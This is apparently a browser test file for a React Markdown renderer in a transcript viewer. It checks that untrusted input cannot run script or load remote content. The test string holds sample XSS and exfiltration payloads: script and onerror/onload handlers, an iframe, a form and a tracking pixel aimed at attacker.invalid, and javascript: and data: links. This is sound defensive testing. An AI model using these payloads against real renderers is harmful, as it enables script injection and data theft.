import { expect, test } from "vitest";
import { render } from "vitest-browser-react";
import { page } from "vitest/browser";
import { MessageMarkdown } from "@/transcript/message-markdown";

test("untrusted Markdown cannot execute HTML or load remote images, frames and forms", async () => {
  const attack = `# Safe heading

![Tracking image](https://attacker.invalid/pixel?secret=private)

<script>window.__markdownAttack = true</script>
<img src="https://attacker.invalid/other" onerror="window.__markdownAttack = true">
<iframe src="https://attacker.invalid/frame"></iframe>
<form action="https://attacker.invalid/post"><input value="private"></form>
<svg onload="window.__markdownAttack = true"><script>window.__markdownAttack = true</script></svg>
<div style="background-image:url(https://attacker.invalid/css)">Styled text</div>

[Unsafe link](javascript:alert(1))
[Data link](data:text/html,bad)
[Credential link](https://user:password@example.com/)
`;
  const view = await render(
    <div data-testid="markdown-security">
      <MessageMarkdown text={attack} />
    </div>,
  );
  await expect.element(page.getByRole("heading", { name: "Safe heading" })).toBeVisible();
  await expect
    .element(page.getByText("[Image not loaded: Tracking image]", { exact: true }))
    .toBeVisible();
  const root = page.getByTestId("markdown-security").element();
  expect(root.querySelectorAll("img,iframe,script,form,input,svg,object,embed,style")).toHaveLength(
    0,
  );
  expect(Array.from(root.querySelectorAll("a")).every((link) => !link.hasAttribute("href"))).toBe(
    true,
  );
  expect(root.querySelector('[style*="attacker"]')).toBeNull();
  expect((window as Window & { __markdownAttack?: boolean }).__markdownAttack).toBeUndefined();
  expect(
    performance
      .getEntriesByType("resource")
      .some((entry) => entry.name.includes("attacker.invalid")),
  ).toBe(false);
  await view.unmount();
});
